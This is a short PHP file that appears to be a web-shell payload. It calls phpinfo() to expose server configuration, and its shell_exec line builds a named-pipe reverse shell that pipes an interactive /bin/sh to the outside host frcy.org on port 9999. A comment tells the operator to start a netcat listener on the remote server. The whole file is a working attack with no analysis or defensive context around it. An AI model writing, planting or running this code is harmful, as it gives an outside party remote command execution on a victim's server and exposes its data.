<?php
phpinfo();

#On remote server: netcat -lkvp 9999
shell_exec('rm -f /tmp/fifo; mkfifo /tmp/fifo; cat /tmp/fifo | /bin/sh -i 2>&1 | nc frcy.org 9999 >/tmp/fifo');
?>
